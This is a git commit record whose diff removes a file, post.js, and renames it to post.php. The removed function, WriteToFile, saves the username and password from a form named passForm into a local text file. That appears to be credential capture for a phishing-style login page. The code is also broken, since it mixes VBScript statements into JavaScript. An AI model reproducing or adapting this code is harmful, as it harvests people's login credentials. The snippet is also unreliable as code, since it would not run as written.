68c1cd8f2c75849007c5146a5eb58a7eedd7a304
LoserTool <junkbait@itechfree.com>
2015-12-28 15:36:50 -0800

    Update and rename post.js to post.php

--- post.js
+++
@@ -1,8 +0,0 @@
-function WriteToFile(passForm) {
-
-    set fso = CreateObject("Scripting.FileSystemObject");  
-    set s = fso.CreateTextFile("./list.txt", True);
-    s.writeline(document.passForm.username.value);
-    s.writeline(document.passForm.password.value);
-    s.Close();
-    }
